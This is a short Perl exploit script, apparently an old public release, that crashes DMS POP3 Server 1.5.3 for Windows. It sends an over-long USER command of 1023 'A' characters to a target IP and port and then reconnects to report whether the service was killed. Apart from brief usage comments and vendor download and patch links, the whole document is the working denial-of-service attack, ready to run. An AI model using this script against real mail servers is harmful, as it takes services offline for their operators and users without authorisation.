#===== Start DMS_POP3_Overflow.pl =====
#
# Usage: DMS_POP3_Overflow.pl <ip> <port>
#        DMS_POP3_Overflow.pl 127.0.0.1 110
#
# DMS POP3 Server for Windows 2000/XP 1.5.3 build 37
#
# Download:
# http://www.digitalmapping.sk.ca/pop3srv/default.asp
#
# Patch:
# http://www.digitalmapping.sk.ca/pop3srv/Update.asp
#
#####################################################

use IO::Socket;
use strict;

my($socket) = "";

if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                    PeerPort => $ARGV[1],
                                    Proto    => "TCP"))
{
        print "Attempting to kill DMS POP3 service at $ARGV[0]:$ARGV[1]...";

        sleep(1);

        print $socket "USER " . "A" x 1023;

        close $socket;

        sleep(1);

        if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                            PeerPort => $ARGV[1],
                                            Proto    => "TCP"))
        {
                close $socket;

                print "failed!\n";
        }
        else
        {
                print "successful!\n";
        }
}
else
{
        print "Cannot connect to $ARGV[0]:$ARGV[1]\n";
}
#===== End DMS_POP3_Overflow.pl =====

